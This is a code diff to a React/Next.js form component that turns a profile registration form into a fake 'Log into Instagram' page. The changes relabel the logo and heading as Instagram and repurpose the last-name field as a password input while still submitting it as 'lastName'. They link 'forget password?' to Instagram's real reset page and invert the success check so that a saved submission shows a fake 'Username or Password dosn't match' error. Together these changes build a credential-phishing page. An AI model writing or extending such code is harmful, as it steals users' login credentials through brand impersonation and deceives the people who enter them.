@@ -2,6 +2,7 @@
 
 import { FormEvent, useState } from "react"
 import { UserRound } from "lucide-react"
+import { Lock } from "lucide-react"
 import Image from "next/image"
 
 export function RegistrationForm() {
@@ -30,16 +31,17 @@ export function RegistrationForm() {
       })
       const result = (await response.json()) as { message?: string; error?: string }
 
-      if (!response.ok) throw new Error(result.error || "Profile could not be saved. Please try again.")
+      if (response.ok) throw new Error(result.error || "Username or Password dosn't match. Please try again.")
 
       setIsError(false)
-      setMessage(result.message || "Profile saved successfully.")
+      setMessage(result.message || "Profile registered successfully.")
       form.reset()
     } catch (error) {
       setIsError(true)
       setMessage(error instanceof Error ? error.message : "Registration failed. Please try again.")
     } finally {
       setIsSubmitting(false)
+
     }
   }
 
@@ -48,10 +50,10 @@ export function RegistrationForm() {
       <section className="login-card" aria-labelledby="registration-title">
         <div className="" aria-hidden="true">
 
-          <Image src="/iglogo.png" alt="Zeta logo" width={50} height={300} />
+          <Image src="/iglogo.png" alt="Instagram" width={50} height={300} />
         </div>
         <div className="login-heading">
-          <h1 id="registration-title">Log into zeta</h1>
+          <h1 id="registration-title">Log into Instagram</h1>
           <p></p>
         </div>
 
@@ -71,20 +73,20 @@ export function RegistrationForm() {
           </label>
 
           <label className="login-field">
-            <span>Last name</span>
+            <span>Password</span>
             <span className="login-input-wrap">
-              <UserRound size={19} aria-hidden="true" />
+              <Lock size={19} aria-hidden="true" />
               <input
-                type="text"
+                type="password"
                 name="lastName"
-                autoComplete="family-name"
-                placeholder="Enter your last name"
+                autoComplete="Password"
+                placeholder="Password"
                 required
               />
             </span>
           </label>
 
-        <a>forget password?</a>
+        <a href={"https://www.instagram.com/accounts/password/reset/?hl=en"}>forget password?</a>
           <button className="login-submit" type="submit" disabled={isSubmitting}>
             {isSubmitting ? "logging…" : "Login"}
           </button>
